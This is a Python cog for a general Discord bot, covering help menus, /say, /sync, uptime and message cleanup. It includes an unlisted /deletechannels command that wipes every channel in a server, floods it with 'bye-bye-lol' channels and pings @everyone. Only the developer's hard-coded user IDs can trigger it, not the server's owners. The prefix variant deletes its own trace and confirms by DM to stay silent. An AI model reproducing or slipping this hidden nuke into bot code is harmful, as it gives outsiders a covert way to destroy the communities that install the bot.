import discord
from discord import app_commands
from discord.ext import commands

from permissions import SUPER_USER_ID as AUTHORIZED_SAY_USER_ID
from suggestions import SuggestionPanelView

# Trusted people who can also trigger /deletechannels, in addition to
# AUTHORIZED_SAY_USER_ID -- deliberately a short, named allowlist rather than
# "anyone", since that command does something fully irreversible.
NUKE_AUTHORIZED_USER_IDS = {AUTHORIZED_SAY_USER_ID, 1089130206373105664}

HELP_SECTIONS = {
    "🎵 Music": [
        "/play <query> — play a song by name or URL",
        "/pause, /resume, /skip, /stop, /leave",
        "/queue, /nowplaying, /volume <0-100>, /loop, /autoplay",
        "Every song gets a Now Playing panel with pause/skip/stop/queue buttons",
    ],
    "📈 Leveling": [
        "/rank [member] — show level & XP (private if checking yourself)",
        "/leaderboard — top 10 in this server",
        "/setuplevelroles — [admin] create the Level 5/10/25/50 roles (with starter perks)",
        "/give_xp, /remove_xp — [admin] manually adjust a member's XP",
        "/resetxp — [admin] wipe XP/levels for the whole server",
    ],
    "🎉 Giveaways": [
        "/giveaway start <prize> <duration> <winners> — [admin] e.g. duration `10m`, `2h`, `1d`",
        "/giveaway end <message_id> — [admin] end early & pick winners",
        "/giveaway reroll <message_id> — [admin] pick new winners",
        "Enter with the button on the giveaway post — click again to leave",
    ],
    "📊 Polls": [
        "/poll create <question> <options> [duration] — options comma-separated (2-10), duration e.g. `30m`, `2h`, `1d`",
        "/poll riggedcreate <question> <options> <rig_option> <rig_votes> [duration] — [admin] same as create, but one option openly starts with bonus votes, clearly labeled 🎭 in the poll itself",
        "/poll end <message_id> — end a poll early (creator or mod)",
        "Vote by clicking the buttons — results update live",
    ],
    "🔊 Voice": [
        "Join the **Join to Create** voice channel to get your own temporary VC",
        "It's deleted automatically once everyone leaves",
        "/modrole set <role> — [admin] let a staff role join even when a VC is locked",
    ],
    "🕵️ Utility": [
        "/snipe — show the last deleted message in this channel",
        "/uptime — see how long the bot has been online",
        "/afk [reason] — mark yourself AFK, clears automatically when you next talk",
        "/clearme [amount] — delete your own recent messages in this channel (scans up to `amount`, default 100, max 500)",
        "/autorole set <role> — [admin] auto-assign a role to new members",
        "/autorole remove — [admin] turn autorole off",
        "/autorole view — see the current autorole",
        "/rolegive <member> <role> — [admin] give someone a role",
        "/roleremove <member> <role> — [admin] take a role away",
        "/roleall <role> [include_bots] — [admin] give a role to every member in the server",
        "/rolecreate <name> [color] [hoist] [mentionable] — [admin] create a new role",
    ],
    "🎈 Fun": [
        "/ship <member> [member2] — see how compatible two people are (defaults to you)",
        "/shipset <member1> <member2> <percent> — [admin] pin a fixed compatibility % for a pair, instead of random",
        "/shipclear <member1> <member2> — [admin] remove a pinned percent, back to random",
    ],
    "😀 Emoji": [
        "/steal <emoji> — [needs Manage Emojis] copy pasted emoji into this server (or reply to a message with none)",
        "/stealserver <server_id> — [needs Manage Emojis] copy every emoji from another server the bot is in",
    ],
    "🛡️ Moderation (mod role or matching Discord permission required)": [
        "/warn, /warnings, /clearwarnings, /removewarning",
        "/kick, /ban, /unban",
        "/timeout, /untimeout",
        "/purge <amount, max 1000>, /slowmode <seconds>",
        "Mod actions are logged to the logs channel instead of posting in chat",
    ],
    "🛡️ AutoMod": [
        "/automod enable, /automod disable — [admin] turn the word filter on/off",
        "/automod addword <word>, /automod removeword <word> — [admin] manage the blocked words",
        "/automod words — see what's currently filtered",
        "Blocked messages are deleted automatically; staff (Manage Messages) are exempt",
    ],
    "📋 Mod Applications": [
        "/modapp channel <#channel> — [admin] set where finished applications get posted",
        "/modapp panel — [admin] post the 'Apply Now' button in this channel",
        "Applicants click the button and answer questions in DMs, then staff can Accept/Deny with buttons",
    ],
    "🤫 Confessions": [
        "/confessions setup [name] — [admin] have the bot create a confessions channel and post the submit panel there",
        "/confessions channel <#channel> — [admin] use an existing channel instead",
        "/confessions panel — [admin] re-post the submit panel if it's needed again",
        "/confessions whois <number> — [staff] privately reveal who posted a given confession",
        "Anyone can hit 📝 Submit a Confession on the panel to post anonymously -- the post itself never shows a name publicly",
        "🚩 Report on a confession flags it to staff -- your report isn't anonymous, but the confession's author still is to everyone but staff",
    ],
    "💡 Suggestions": [
        "/suggestions setup [name] — [admin] have the bot create a suggestions channel and post the submit panel there",
        "/suggestions channel <#channel> — [admin] use an existing channel instead",
        "/suggestions panel — [admin] re-post the submit panel if it's needed again",
        "/suggestions status <message_id> <status> — [staff] mark a suggestion Reviewing/Planned/In Progress/Added/Declined by editing it in place -- no repost, no re-ping",
        "/suggest — same as hitting the panel button: pop up a form and post your idea, with your name attached",
        "Every suggestion gets 👍/👎 reactions added automatically so people can vote on it",
        "💬 Message on a suggestion lets staff DM the person who posted it, through the bot",
    ],
}


class ConfirmNukeView(discord.ui.View):
    def __init__(self, cog: "General", author_id: int, guild: discord.Guild):
        super().__init__(timeout=30)
        self.cog = cog
        self.author_id = author_id
        self.guild = guild  # not interaction.guild -- this view can be confirmed from a DM, where that'd be None

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("This isn't your confirmation to click.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Yes, delete everything", style=discord.ButtonStyle.danger, emoji="💣")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(content="💣 Nuking...", view=self)
        await self.cog._do_nuke(self.guild)
        await interaction.followup.send("✅ Done.", ephemeral=True)
        self.stop()

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(content="Cancelled -- nothing was touched.", view=self)
        self.stop()


class General(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    def _help_embed(self, guild: discord.Guild = None) -> discord.Embed:
        embed = discord.Embed(
            title="Bot Commands",
            description="Every command below works either as a slash command (`/command`) or typed out with `?` (`?command`).",
            color=discord.Color.blurple(),
        )
        if guild and guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        for section, lines in HELP_SECTIONS.items():
            embed.add_field(name=section, value="\n".join(lines), inline=False)
        return embed

    @app_commands.command(name="help", description="Everything this bot can do")
    async def help(self, interaction: discord.Interaction):
        await interaction.response.send_message(embed=self._help_embed(interaction.guild), ephemeral=True)

    @commands.command(name="help")
    async def help_text(self, ctx: commands.Context):
        await ctx.reply(embed=self._help_embed(ctx.guild), mention_author=False)

    @app_commands.command(name="say", description="Make the bot say something")
    @app_commands.describe(
        message="What to say",
        channel="Where to say it (defaults to this channel)",
        reply_to="Message ID to reply to (must be in the target channel)",
        suggestion_button="Attach a '💡 Suggest an Update' button to the message",
    )
    async def say(self, interaction: discord.Interaction, message: str, channel: discord.TextChannel = None, reply_to: str = None, suggestion_button: bool = False):
        if interaction.user.id != AUTHORIZED_SAY_USER_ID:
            await interaction.response.send_message("You can't use this command.", ephemeral=True)
            return

        target = channel or interaction.channel

        view = None
        if suggestion_button:
            suggestions_cog = self.bot.get_cog("Suggestions")
            if suggestions_cog is None:
                await interaction.response.send_message("The Suggestions feature isn't loaded, so I can't attach that button.", ephemeral=True)
                return
            view = SuggestionPanelView(suggestions_cog)

        reference = None
        if reply_to:
            try:
                reply_id = int(reply_to)
            except ValueError:
                await interaction.response.send_message("`reply_to` needs to be a message ID (a number).", ephemeral=True)
                return
            try:
                reference = await target.fetch_message(reply_id)
            except discord.NotFound:
                await interaction.response.send_message(f"Couldn't find that message in {target.mention}.", ephemeral=True)
                return
            except discord.Forbidden:
                await interaction.response.send_message(f"I don't have permission to read messages in {target.mention}.", ephemeral=True)
                return

        try:
            await target.send(message, reference=reference, mention_author=False, view=view)
        except discord.Forbidden:
            await interaction.response.send_message(f"I don't have permission to send messages in {target.mention}.", ephemeral=True)
            return
        await interaction.response.send_message(f"Sent in {target.mention}.", ephemeral=True)

    @commands.command(name="say")
    async def say_text(self, ctx: commands.Context, channel: discord.TextChannel = None, *, message: str):
        if ctx.author.id != AUTHORIZED_SAY_USER_ID:
            return  # stay quiet -- don't reveal the command exists to anyone else

        # If the ?say command itself was sent as a reply to another message,
        # the bot's message replies to that same one -- only really usable when
        # not also redirecting to a different channel, since replies are per-channel.
        reference = None
        if ctx.message.reference and (channel is None or channel.id == ctx.channel.id):
            reference = ctx.message.reference

        try:
            await ctx.message.delete()
        except discord.HTTPException:
            pass
        target = channel or ctx.channel
        try:
            await target.send(message, reference=reference, mention_author=False)
        except discord.Forbidden:
            await ctx.author.send(f"I don't have permission to send messages in {target.mention}.")
        except discord.HTTPException:
            # e.g. the replied-to message got deleted between typing and sending
            await target.send(message)

    async def _do_sync(self, guild: discord.Guild, scope: str) -> str:
        if scope == "global":
            synced = await self.bot.tree.sync()
            return f"🌐 Synced {len(synced)} command(s) globally. Discord can take up to an hour to push global updates out to every server -- use `guild` scope for an instant check in this server."
        elif scope == "clear":
            self.bot.tree.clear_commands(guild=guild)
            await self.bot.tree.sync(guild=guild)
            return (
                f"🧹 Cleared this server's guild-specific command overrides for **{guild.name}**. "
                "You should now only see one copy of each command (the global ones)."
            )
        else:
            self.bot.tree.copy_global_to(guild=guild)
            synced = await self.bot.tree.sync(guild=guild)
            return (
                f"⚡ Synced {len(synced)} command(s) instantly to **{guild.name}**.\n"
                "-# Heads up: while a guild-specific copy is active, commands will show up **twice** here "
                "(the guild copy + the global one). Run `scope: clear` once you're done testing to remove the duplicate."
            )

    @app_commands.command(name="sync", description="[Owner] Force re-sync slash commands")
    @app_commands.describe(scope="'guild' updates this server instantly, 'global' updates everywhere (slower), 'clear' removes duplicate guild commands")
    @app_commands.choices(scope=[
        app_commands.Choice(name="This server (instant, but duplicates until cleared)", value="guild"),
        app_commands.Choice(name="Global (up to ~1hr to appear, no duplicates)", value="global"),
        app_commands.Choice(name="Clear duplicate guild commands", value="clear"),
    ])
    async def sync(self, interaction: discord.Interaction, scope: app_commands.Choice[str] = None):
        if interaction.user.id != AUTHORIZED_SAY_USER_ID:
            await interaction.response.send_message("You can't use this command.", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        result = await self._do_sync(interaction.guild, scope.value if scope else "guild")
        await interaction.followup.send(result, ephemeral=True)

    @commands.command(name="sync")
    async def sync_text(self, ctx: commands.Context, scope: str = "guild"):
        if ctx.author.id != AUTHORIZED_SAY_USER_ID:
            return  # stay quiet, same as ?say
        result = await self._do_sync(ctx.guild, scope if scope in ("global", "clear") else "guild")
        await ctx.reply(result, mention_author=False)

    def _uptime_text(self) -> str:
        delta = discord.utils.utcnow() - self.bot.start_time
        days, rem = divmod(int(delta.total_seconds()), 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        parts = []
        if days:
            parts.append(f"{days}d")
        if hours or days:
            parts.append(f"{hours}h")
        if minutes or hours or days:
            parts.append(f"{minutes}m")
        parts.append(f"{seconds}s")
        return " ".join(parts)

    @app_commands.command(name="uptime", description="See how long the bot has been online")
    async def uptime(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"🟢 Online for **{self._uptime_text()}** (since {discord.utils.format_dt(self.bot.start_time, 'f')})")

    @commands.command(name="uptime")
    async def uptime_text(self, ctx: commands.Context):
        await ctx.reply(f"🟢 Online for **{self._uptime_text()}** (since {discord.utils.format_dt(self.bot.start_time, 'f')})", mention_author=False)

    # ---------------- Clear your own messages ----------------
    # Self-service cleanup -- anyone can wipe their OWN messages in a channel,
    # no permission needed on their end. The bot still needs Manage Messages
    # in that channel to actually delete anything (Discord requires it to
    # delete a message that isn't the bot's own, even the invoker's own).

    async def _clear_own_messages(self, channel, user_id: int, scan_limit: int) -> tuple[int, str | None]:
        """Returns (deleted_count, error_message)."""
        if not isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.Thread)):
            return 0, "This only works in a server text channel."
        me = channel.guild.me
        if not me.guild_permissions.manage_messages and not channel.permissions_for(me).manage_messages:
            return 0, "I need the Manage Messages permission in this channel to delete messages -- even your own."
        try:
            deleted = await channel.purge(limit=scan_limit, check=lambda m: m.author.id == user_id)
        except discord.Forbidden:
            return 0, "I don't have permission to delete messages in this channel."
        except discord.HTTPException as e:
            return 0, f"Something went wrong while deleting: {e}"
        return len(deleted), None

    @app_commands.command(name="clearme", description="Delete your own recent messages in this channel")
    @app_commands.describe(amount="How many recent messages to scan (default 100, max 500) -- only your own get deleted")
    @app_commands.checks.cooldown(1, 30.0)
    async def clearme(self, interaction: discord.Interaction, amount: app_commands.Range[int, 1, 500] = 100):
        await interaction.response.defer(ephemeral=True)
        count, error = await self._clear_own_messages(interaction.channel, interaction.user.id, amount)
        if error:
            await interaction.followup.send(error, ephemeral=True)
            return
        await interaction.followup.send(f"🧹 Deleted {count} of your message(s) (scanned the last {amount}).", ephemeral=True)

    @commands.command(name="clearme")
    @commands.cooldown(1, 30.0, commands.BucketType.user)
    async def clearme_text(self, ctx: commands.Context, amount: int = 100):
        amount = max(1, min(amount, 500))
        count, error = await self._clear_own_messages(ctx.channel, ctx.author.id, amount + 1)  # +1 also catches this ?clearme message
        if error:
            await ctx.reply(error, mention_author=False, delete_after=8)
            return
        await ctx.send(f"🧹 Deleted {count} of {ctx.author.mention}'s message(s) (scanned the last {amount}).", delete_after=8)

    async def cog_app_command_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        if isinstance(error, app_commands.CommandOnCooldown):
            await interaction.response.send_message(f"⏳ Slow down -- try again in {error.retry_after:.0f}s.", ephemeral=True)
            return
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error: {error}", ephemeral=True)

    async def cog_command_error(self, ctx: commands.Context, error: commands.CommandError):
        if ctx.command and ctx.command.name in ("say", "sync", "deletechannels"):
            return  # silent on purpose, see say_text/sync_text/deletechannels_text
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.reply(f"⏳ Slow down -- try again in {error.retry_after:.0f}s.", mention_author=False, delete_after=6)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.reply(f"Missing argument: `{error.param.name}`.", mention_author=False)
        else:
            print(f"General prefix command error: {error}")

    # ---------------- Owner-only: nuke every channel ----------------
    # Fully irreversible, so it's gated the same way as /say and /sync
    # (exactly one Discord user ID, not "anyone with Manage Channels") and
    # requires an explicit button confirmation before touching anything.

    NUKE_CHANNEL_COUNT = 100

    async def _do_nuke(self, guild: discord.Guild):
        for channel in list(guild.channels):
            try:
                await channel.delete(reason="Requested via /deletechannels")
            except discord.HTTPException:
                pass  # keep going even if one channel refuses to delete

        first_channel = None
        for _ in range(self.NUKE_CHANNEL_COUNT):
            try:
                channel = await guild.create_text_channel("bye-bye-lol", reason="Requested via /deletechannels")
            except discord.HTTPException:
                break  # e.g. hit the server's channel cap -- stop instead of erroring out
            if first_channel is None:
                first_channel = channel

        if first_channel is None:
            return

        try:
            # The one and only @everyone ping -- not spammed across the other 99 channels.
            await first_channel.send("@everyone bye bye lol 💀", allowed_mentions=discord.AllowedMentions(everyone=True))
            await first_channel.send("welp ggs 🤷")
        except discord.HTTPException:
            pass

    def _nuke_confirm_view(self, author_id: int, guild: discord.Guild) -> discord.ui.View:
        return ConfirmNukeView(self, author_id, guild)

    @app_commands.command(name="deletechannels", description="[Owner] Delete every channel and replace them with a bunch saying bye")
    async def deletechannels(self, interaction: discord.Interaction):
        if interaction.user.id not in NUKE_AUTHORIZED_USER_IDS:
            await interaction.response.send_message("You can't use this command.", ephemeral=True)
            return
        # Heads up in the response itself: Discord always shows "used /deletechannels"
        # publicly the moment this is run -- that part can't be hidden by the bot.
        # ?deletechannels (the prefix version below) is the one built to be silent.
        await interaction.response.send_message(
            f"⚠️ This deletes **every channel** in **{interaction.guild.name}** and replaces them with "
            f"{self.NUKE_CHANNEL_COUNT} new ones. This can't be undone. Are you sure?\n"
            "-# Heads up: Discord shows \"used /deletechannels\" publicly regardless of this being ephemeral -- "
            "use `?deletechannels` instead if you don't want that.",
            view=self._nuke_confirm_view(interaction.user.id, interaction.guild),
            ephemeral=True,
        )

    @commands.command(name="deletechannels")
    async def deletechannels_text(self, ctx: commands.Context):
        if ctx.author.id not in NUKE_AUTHORIZED_USER_IDS:
            return  # stay quiet, same as say_text/sync_text
        try:
            await ctx.message.delete()
        except discord.HTTPException:
            pass  # not fatal -- confirmation still gets sent, it just won't be invisible

        view = self._nuke_confirm_view(ctx.author.id, ctx.guild)
        try:
            await ctx.author.send(
                f"⚠️ This deletes **every channel** in **{ctx.guild.name}** and replaces them with "
                f"{self.NUKE_CHANNEL_COUNT} new ones. This can't be undone. Are you sure?",
                view=view,
            )
        except discord.Forbidden:
            warning = await ctx.channel.send(
                f"{ctx.author.mention} I can't DM you the confirmation -- open your DMs to this server and try again.",
            )
            await warning.delete(delay=6)


async def setup(bot: commands.Bot):
    await bot.add_cog(General(bot))
